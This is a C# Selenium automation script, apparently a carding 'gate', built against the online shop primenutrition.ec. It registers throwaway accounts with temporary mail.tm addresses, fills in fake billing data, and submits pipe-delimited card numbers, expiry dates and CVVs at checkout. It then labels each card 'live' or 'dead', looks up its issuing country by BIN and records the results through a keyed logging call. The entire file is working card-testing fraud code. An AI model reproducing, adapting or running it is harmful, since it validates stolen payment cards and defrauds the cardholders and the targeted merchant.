using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Primenutrition
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        string producto;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {
            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }

        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0)
            {

                Form1.circularProgressBar1.Value = 5;
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://primenutrition.ec/product-category/pre-entrenos/";
                Thread.Sleep(2000);
                correo = "joseffernana" + getNum() + "@hotmail.com";

                 producto = "//*[@id='primary']/ul/li["+RandomNumber(1,3).ToString()+"]/h3/a";

                if (IsElementPresent(By.XPath(producto)))
                {
                    Form1.circularProgressBar1.Value = 20;
                    driver.FindElement(By.XPath(producto)).Click();
                    Thread.Sleep(2000);

                    if (tiempoElemento(By.XPath("/html/body/div[2]/div[1]/div/div/div[2]/div[2]/div[4]/div[1]/form/div[2]/div[2]/button"))){
                        Form1.circularProgressBar1.Value = 30;
                        driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div/div/div[2]/div[2]/div[4]/div[1]/form/div[2]/div[2]/button")).Click();
                        Thread.Sleep(1000);
                        driver.Navigate().GoToUrl("https://primenutrition.ec/cart/");
                        Thread.Sleep(1000);
                        if (tiempoElemento(By.XPath("/html/body/div[2]/div[2]/div/div/main/article/div/div/div[2]/div/div/a")))
                        {
                            Form1.circularProgressBar1.Value = 50;
                            driver.FindElement(By.XPath("/html/body/div[2]/div[2]/div/div/main/article/div/div/div[2]/div/div/a")).Click();
                            Thread.Sleep(1000);

                            if (IsElementPresent(By.XPath("/html/body/div[2]/div[2]/div/div/main/article/div/div/h2/span[2]")))
                            {
                                Form1.circularProgressBar1.Value = 60;
                                driver.FindElement(By.XPath("/html/body/div[2]/div[2]/div/div/main/article/div/div/h2/span[2]")).Click();
                                Thread.Sleep(1000);
                                getcorreo();
                                driver.FindElement(By.XPath("//*[@id='reg_username']")).SendKeys(correo);
                                driver.FindElement(By.XPath("//*[@id='reg_email']")).SendKeys(correo);
                                driver.FindElement(By.XPath("//*[@id='reg_password']")).SendKeys("..Jose..12"+RandomNumber(100,500));
                                Thread.Sleep(500);
                                driver.FindElement(By.Name("register")).Submit();
                                Thread.Sleep(1000);
                                if (tiempoElemento(By.XPath("//*[@id='billing_first_name']")))
                                {
                                    Form1.circularProgressBar1.Value = 70;
                                    driver.FindElement(By.Id("billing_first_name")).SendKeys("JOSE");
                                    Thread.Sleep(300);
                                    driver.FindElement(By.Id("billing_wooccm10")).SendKeys("051425"+RandomNumber(1000,9000));
                                    Thread.Sleep(300);
                                    driver.FindElement(By.Id("billing_last_name")).SendKeys("REYES");
                                    Thread.Sleep(300);
                                    driver.FindElement(By.Id("billing_address_1")).SendKeys("GUAYAS");
                                    Thread.Sleep(300);
                                    driver.FindElement(By.Id("billing_city")).SendKeys("GUAYAS");
                                    Thread.Sleep(300);
                                    driver.FindElement(By.Id("billing_postcode")).SendKeys("0000");
                                    Thread.Sleep(300);
                                    driver.FindElement(By.Id("billing_phone")).SendKeys("099652" + RandomNumber(1000, 9000));
                                    Thread.Sleep(300);
                                    driver.FindElement(By.XPath("//*[@id='payment']/div/div/p/label/span[1]")).Click();
                                    
                                    Thread.Sleep(300);

                                    driver.FindElement(By.Id("place_order")).Submit();
                                    Thread.Sleep(1000);

                                    if (tiempoElemento(By.XPath("/html/body/div[2]/div[1]/div/div/main/article/div/div/div[3]/div/form/div[2]/div[2]/iframe")))
                                    {
                                        pago();
                                       
     
                                    }
                                    else
                                    {
                                        restart();
                                    }
                                }


                            }
                            else
                            {
                                restart();
                            }

                        }
                        else
                        {
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }
                    
                }
                else
                {
                    restart();
                }



            }
        }


        public void getcorreo()
        {
            //###--obtener email--#####
            ((IJavaScriptExecutor)driver).ExecuteScript("window.open();");
            driver.SwitchTo().Window(driver.WindowHandles.Last());
            Thread.Sleep(300);
            driver.Url = "https://mail.tm/es";
            Thread.Sleep(3000);

            if (tiempoElemento(By.XPath("//*[@id='address']")))
            {
                correo = driver.FindElement(By.XPath("//*[@id='address']")).GetAttribute("value");
                Thread.Sleep(1000);
            }
            else
            {
                restart();
            }

            Thread.Sleep(500);

            driver.SwitchTo().Window(driver.WindowHandles.First());
        }

        private bool IsElementPresent(By by)    
        {
            try
            {
                Thread.Sleep(2000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 3)
                    {
                        Form1.circularProgressBar1.Value = 80;

                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];
                        var mes = ccLine[1];
                        var anio = ccLine[2].Remove(0,2);


                        driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div/div/main/article/div/div/div[3]/div/form/div[2]/div[2]/iframe")));
                        Thread.Sleep(800);

                        driver.FindElement(By.Name("card.number")).SendKeys(ccLine[0]+Keys.Tab);
                        Thread.Sleep(1000);

                        var inputmes = driver.SwitchTo().ActiveElement();
                        Thread.Sleep(500);

                        for(var i = 0; i <= 1; i++)
                        {
                            inputmes.SendKeys(mes[i].ToString());
                            Thread.Sleep(300);
                        }

                        for (var i = 0; i <= 1; i++)
                        {
                            inputmes.SendKeys(anio[i].ToString());
                            Thread.Sleep(300);
                        }

                        driver.SwitchTo().ParentFrame();
                        Thread.Sleep(1000);

                        driver.FindElement(By.Name("card.holder")).SendKeys("Jose Reyes");
                        Thread.Sleep(500);

                        driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div/div/main/article/div/div/div[3]/div/form/div[5]/div[2]/iframe")));

                        driver.FindElement(By.Name("card.cvv")).SendKeys(ccLine[3]);
                        Thread.Sleep(200);

                        driver.SwitchTo().ParentFrame();
                        Thread.Sleep(1000);

                        driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div/div/main/article/div/div/div[3]/div/form/div[12]/div/button")).Click();

                        Thread.Sleep(3000);


                        Form1.circularProgressBar1.Value = 95;

                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            //restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            Thread.Sleep(300);
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                restart();
            }

        }

        public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {


                    if (IsElementPresent(By.XPath("/html/body/div/h1")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div/h1")).Text.Trim() == "Error en el pago")
                            {
                                estado = "dead";
                            }
                        }
                    }

                   
                }
                else
                {
                    estado = "live";
                }

                tiempo++;
            }



            if (estado == "dead")
            {
                Thread.Sleep(1000);
                driver.Navigate().GoToUrl("https://primenutrition.ec/checkout/");
                Thread.Sleep(1000);
                driver.FindElement(By.XPath("//*[@id='payment']/div/div/p/label/span[1]")).Click();
                Thread.Sleep(300);
                driver.FindElement(By.Id("place_order")).Submit();
                Thread.Sleep(1000);
                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

